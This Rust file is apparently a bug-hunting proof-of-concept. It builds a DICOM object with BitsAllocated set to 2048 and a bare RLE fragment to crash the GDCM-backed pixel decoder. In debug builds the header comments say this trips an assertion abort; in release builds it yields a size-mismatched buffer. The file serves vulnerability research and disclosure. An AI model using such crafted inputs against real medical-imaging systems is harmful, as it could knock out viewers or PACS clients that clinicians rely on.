//! Real, end-to-end reproduction using the public `dicom_pixeldata::PixelDecoder` API
//! (the `gdcm` feature, i.e. the exact FFI path `gdcm-rs`/vendored GDCM 3.1 uses) on an
//! ordinary `FileDicomObject<InMemDicomObject>` built entirely through this crate's own
//! public element-insertion API - the same public entry point any real caller (a DICOM
//! viewer, a PACS client parsing an incoming file) would use.
//!
//! `BitsAllocated = 2048` is a legal value for the attribute's own 16-bit ("US") range,
//! and this crate's own attribute reader (`pixeldata::attribute::bits_allocated`) accepts
//! it without complaint. But GDCM's `gdcm::PixelFormat::GetPixelSize()` computes
//! `pixelsize = (uint8_t)(BitsAllocated / 8); pixelsize *= SamplesPerPixel;` - an 8-bit
//! narrowing cast - so 2048 / 8 = 256 truncates to 0 *before* the multiply, making
//! GDCM's own `Bitmap::GetBufferLength()` (Rows * Columns * PixelSize) return 0
//! regardless of the declared Rows/Columns/SamplesPerPixel.
//!
//! In a GDCM build with assertions enabled (a plain/Debug CMake build of the vendored
//! GDCM sources, which is what a plain `cargo build`/`cargo test` produces in this
//! sandbox), this 0-length buffer trips `assert(length)` in
//! `gdcm::RLECodec::DecodeByStreams` and aborts the whole process (SIGABRT) - triggered
//! purely by an ordinary, individually-legal DICOM attribute value, no malformed pixel
//! data required.
//!
//! In a GDCM build with `NDEBUG` (a Release CMake build, matching what a real
//! `cargo build --release` deployment would produce), the assertion is compiled out and
//! the call instead returns `Ok(DecodedPixelData)` whose declared `cols`/`rows` (64x64)
//! do not match its actual (empty) `data` buffer - the same declared-vs-actual-size
//! mismatch precondition already shown (candidates 086/087 in this project's own
//! `___BUGHUNT___/`) to feed a `usize` multiply-overflow panic in
//! `pixeldata/src/lib.rs`'s `frame_data`/`to_dynamic_image` when a caller subsequently
//! does something ordinary with the result.

use dicom_core::value::PixelFragmentSequence;
use dicom_core::{DataElement, PrimitiveValue, VR, dicom_value};
use dicom_dictionary_std::tags;
use dicom_object::{FileDicomObject, FileMetaTableBuilder, InMemDicomObject};
use dicom_pixeldata::PixelDecoder;

fn build_object() -> FileDicomObject<InMemDicomObject> {
    let cols: u16 = 64;
    let rows: u16 = 64;
    let bits_allocated: u16 = 2048;

    let meta = FileMetaTableBuilder::new()
        .transfer_syntax(dicom_dictionary_std::uids::RLE_LOSSLESS)
        .media_storage_sop_class_uid(dicom_dictionary_std::uids::SECONDARY_CAPTURE_IMAGE_STORAGE)
        .media_storage_sop_instance_uid("2.25.222222222222222222222222222222222222222")
        .build()
        .unwrap();

    let mut obj = FileDicomObject::new_empty_with_meta(meta);

    obj.put_element(DataElement::new(tags::ROWS, VR::US, dicom_value!(U16, [rows])));
    obj.put_element(DataElement::new(tags::COLUMNS, VR::US, dicom_value!(U16, [cols])));
    obj.put_element(DataElement::new(
        tags::SAMPLES_PER_PIXEL,
        VR::US,
        dicom_value!(U16, [1]),
    ));
    obj.put_element(DataElement::new(
        tags::PHOTOMETRIC_INTERPRETATION,
        VR::CS,
        PrimitiveValue::from("MONOCHROME2"),
    ));
    obj.put_element(DataElement::new(
        tags::BITS_ALLOCATED,
        VR::US,
        dicom_value!(U16, [bits_allocated]),
    ));
    obj.put_element(DataElement::new(tags::BITS_STORED, VR::US, dicom_value!(U16, [8])));
    obj.put_element(DataElement::new(tags::HIGH_BIT, VR::US, dicom_value!(U16, [7])));
    obj.put_element(DataElement::new(
        tags::PIXEL_REPRESENTATION,
        VR::US,
        dicom_value!(U16, [0]),
    ));
    obj.put_element(DataElement::new(
        tags::NUMBER_OF_FRAMES,
        VR::IS,
        PrimitiveValue::from("1"),
    ));

    // A single, well-formed RLE fragment: a bare 64-byte RLE header
    // (NumberOfSegments = 1, Offset[0] = 64) with no further payload - nothing
    // malformed about the fragment itself.
    let mut fragment = vec![0u8; 64];
    fragment[0..4].copy_from_slice(&1u32.to_le_bytes());
    fragment[4..8].copy_from_slice(&64u32.to_le_bytes());

    obj.put_element(DataElement::new(
        tags::PIXEL_DATA,
        VR::OB,
        PixelFragmentSequence::new(Vec::<u32>::new(), vec![fragment]),
    ));

    obj
}

fn main() {
    let obj = build_object();

    println!("calling decode_pixel_data() via the gdcm feature's FFI path...");
    match obj.decode_pixel_data() {
        Ok(decoded) => {
            println!(
                "did not abort - decode_pixel_data() returned Ok: claimed cols={} rows={} number_of_frames={}, actual data.len()={}",
                decoded.columns(),
                decoded.rows(),
                decoded.number_of_frames(),
                decoded.data().len()
            );
            if decoded.data().len() < (decoded.columns() * decoded.rows()) as usize {
                println!(
                    "MISMATCH: declared dimensions ({}x{}) imply more bytes than the actual decoded buffer contains ({} bytes)",
                    decoded.columns(),
                    decoded.rows(),
                    decoded.data().len()
                );
            }
        }
        Err(e) => {
            println!("did not abort - decode_pixel_data() returned a graceful Err: {e}");
        }
    }
}
